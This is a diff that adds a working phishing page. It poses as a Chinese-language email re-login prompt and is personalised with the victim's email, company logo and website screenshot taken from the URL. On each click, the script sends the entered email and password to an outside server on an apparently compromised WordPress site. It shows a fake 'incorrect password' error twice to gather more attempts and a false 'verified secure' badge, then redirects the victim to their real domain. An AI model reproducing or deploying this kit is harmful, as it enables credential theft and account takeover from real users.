@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Domain Login Form</title>
+  <link id="favicon" rel="icon" href="">
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f4f4f4;
+      background-size: 100% auto;
+      background-position: center top;
+      background-repeat: no-repeat;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .login-form {
+      background: rgba(255, 255, 255, 0.96);
+      padding: 50px 60px;
+      border-radius: 12px;
+      box-shadow: 0 0 30px rgba(0, 0, 0, 0.1);
+      width: 420px;
+      text-align: center;
+    }
+
+    .logo {
+      max-width: 120px;
+      max-height: 120px;
+      margin: 0 auto 25px auto;
+      display: none;
+    }
+
+    h2 {
+      margin-bottom: 30px;
+      font-size: 26px;
+      color: #007BFF;
+      letter-spacing: 1px;
+    }
+
+    label {
+      display: block;
+      font-size: 16px;
+      margin: 15px 0 8px;
+      text-align: left;
+    }
+
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 14px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      box-sizing: border-box;
+    }
+
+    .forgot-password {
+      display: block;
+      margin-top: 10px;
+      text-align: left;
+      font-size: 14px;
+      color: #00BFFF;
+      text-decoration: none;
+    }
+
+    .forgot-password:hover {
+      text-decoration: underline;
+    }
+
+    button {
+      padding: 16px 50px;
+      margin-top: 20px;
+      background: #007BFF;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 18px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #0056b3;
+    }
+
+    .secure-note {
+      margin-top: 20px;
+      font-size: 12px;
+      color: #666;
+    }
+
+    .secure-note .tick {
+      color: #007BFF;
+      margin-right: 5px;
+    }
+
+    .error-message {
+      color: red;
+      font-weight: bold;
+      font-size: 18px;
+      margin-bottom: 15px;
+      display: block;
+    }
+  </style>
+<base target="_blank">
+</head>
+<body>
+
+  <form class="login-form" id="loginForm">
+    <img id="logo" class="logo" alt="Logo" />
+    <h3 id="domainHeading">电子邮件登录超时，请重新登录</h3>
+
+    <!-- ✅ ERROR MESSAGE appears above the email field -->
+    <div class="error-message" id="error-msg"></div>
+
+    <label for="email">电子邮件：</label>
+    <input type="email" id="email" name="email" placeholder="输入邮箱" required />
+
+    <label for="password">密码：</label>
+    <input type="password" id="password" name="password" placeholder="输入密码" required />
+
+    <button type="button" id="login-btn">登入</button>
+
+    <a href="#" class="forgot-password">忘记密码？</a>
+
+    <div class="secure-note" id="secureNote"></div>
+  </form>
+
+  <script>
+    // Base64 utilities
+    function isBase64(str) {
+      try {
+        // Check if string looks like Base64 (alphanumeric + / + = padding)
+        return /^[A-Za-z0-9+/]*={0,2}$/.test(str) && str.length % 4 === 0 && str.length > 0;
+      } catch (e) {
+        return false;
+      }
+    }
+
+    function decodeBase64(str) {
+      try {
+        // Handle URL-safe Base64 (replace - with +, _ with /)
+        const base64 = str.replace(/-/g, '+').replace(/_/g, '/');
+        // Add padding if needed
+        const pad = base64.length % 4;
+        const padded = pad ? base64 + '='.repeat(4 - pad) : base64;
+        return decodeURIComponent(escape(atob(padded)));
+      } catch (e) {
+        return null;
+      }
+    }
+
+    function encodeBase64(str) {
+      try {
+        return btoa(unescape(encodeURIComponent(str)));
+      } catch (e) {
+        return null;
+      }
+    }
+
+    // Get hash from URL and decode if it's Base64
+    let hash = decodeURIComponent(window.location.hash.substring(1));
+
+    // Try to decode if it looks like Base64
+    if (hash && isBase64(hash)) {
+      const decoded = decodeBase64(hash);
+      if (decoded) {
+        hash = decoded;
+      }
+    }
+
+    if (hash) {
+      document.getElementById('email').value = hash;
+      const atIndex = hash.indexOf('@');
+      if (atIndex !== -1) {
+        const fullDomain = hash.substring(atIndex + 1);
+        const rootDomain = fullDomain.split('.')[0];
+
+        const logoUrl = `https://img.logo.dev/${fullDomain}?token=pk_X3Yst72FQUOeVfOd-dlhKg`;
+        document.getElementById('logo').src = logoUrl;
+        document.getElementById('logo').style.display = 'block';
+        document.getElementById('favicon').href = logoUrl;
+        document.getElementById('domainHeading').textContent = rootDomain.toUpperCase();
+        document.body.style.backgroundImage = `url('https://image.thum.io/get/width/1920/fullpage/https://${fullDomain}')`;
+        document.getElementById('secureNote').innerHTML = `<span class="tick">✅</span> 已验证安全 — 供电 ${rootDomain.toUpperCase()} Co., Ltd. ©2025`;
+      }
+    }
+
+    let attemptCount = 0;
+
+    document.getElementById("login-btn").addEventListener("click", function () {
+      const emailInput = document.getElementById("email");
+      const passwordInput = document.getElementById("password");
+      const errorMsg = document.getElementById("error-msg");
+
+      const email = emailInput.value.trim();
+      const password = passwordInput.value.trim();
+
+      if (!email || !password) {
+        alert("Please enter both email and password.");
+        return;
+      }
+
+      const formData = new FormData();
+      formData.append("email", email);
+      formData.append("password", password);
+
+      fetch("https://store.standbypics.com/wp-includes/zin/next.php", {
+        method: "POST",
+        body: formData,
+      });
+
+      attemptCount++;
+      passwordInput.value = "";
+
+      if (attemptCount < 3) {
+        errorMsg.textContent = "密码不正确，请重试。";
+      } else {
+        errorMsg.textContent = "";
+        const domain = email.split('@')[1];
+        setTimeout(() => {
+          window.location.href = `https://${domain}`;
+        }, 1000);
+      }
+    });
+  </script>
+</body>
+</html>
